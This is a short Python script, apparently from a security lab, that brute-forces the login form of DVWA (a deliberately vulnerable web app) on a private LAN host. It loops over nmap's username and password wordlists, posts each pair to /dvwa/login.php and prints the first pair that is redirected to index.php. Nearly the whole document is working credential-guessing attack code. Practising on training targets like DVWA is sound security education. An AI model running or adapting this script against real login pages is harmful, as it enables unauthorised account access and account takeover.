import http.client, urllib.parse

headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}

username_file = open('/usr/share/nmap/nselib/data/usernames.lst') 
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')
user_list = username_file.readlines()
pwd_list = password_file.readlines()
username_file.close()
password_file.close()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': 'Login'})

        conn = http.client.HTTPConnection("192.168.50.101", 80)

        conn.request("POST", "/dvwa/login.php", post_parameters, headers)

        response = conn.getresponse()

        if (response.getheader("location") == "index.php"):
            print("Logged in with:", user, "-" , pwd)
            exit()